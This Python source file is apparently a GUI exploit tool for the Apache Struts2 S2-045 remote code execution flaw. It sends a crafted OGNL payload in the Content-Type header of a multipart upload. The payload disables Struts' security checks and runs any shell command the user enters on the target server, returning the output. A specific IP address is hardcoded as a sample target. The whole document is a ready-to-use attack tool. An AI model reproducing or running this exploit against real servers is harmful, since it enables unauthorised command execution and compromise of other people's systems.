#coding:utf-8
import urllib2
from Tkinter import *
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
class START():

    def __init__(self,root):
        self.siteurl="http://153.0.136.209:8280/reg.do?ACCOUNT_ID=8088"
        self.root=root
        self.show_W_Text = Text(root,width=300,text='nihao')
        self.show_url_ed = Label(root,text='siteaddress')
        self.edit_url =Entry(root,width = 150,text='')
        self.show_cmd_ed = Label(root,text="cmd")
        self.edit_cmd = Entry(root,width = 150,text="input cmd")
        self.butt_whois = Button(root,text="check",command=self.poc)
        self.show_url_ed.pack()
        self.edit_url.pack()
        self.show_cmd_ed.pack()
        self.edit_cmd.pack()
        self.butt_whois.pack()
        self.show_W_Text.pack()

    def poc(self):
        w_url = self.edit_url.get()
        #w_url =self.siteurl
        w_cmd = self.edit_cmd.get()
        text = self.show_W_Text
        register_openers()
        datagen, header = multipart_encode({"image1": open("/home/kaleo/mybash/tmp.txt", "rb")})
        header[
            "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header[
            "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+w_cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        request = urllib2.Request(w_url, datagen, headers=header)
        response = urllib2.urlopen(request).read()
        text.insert(1.0, w_cmd)
        text.insert(1.0, response)


if __name__ == '__main__':

    root=Tk()
    root.title("str2 045_kaleo")
    motion=START(root)
    mainloop()

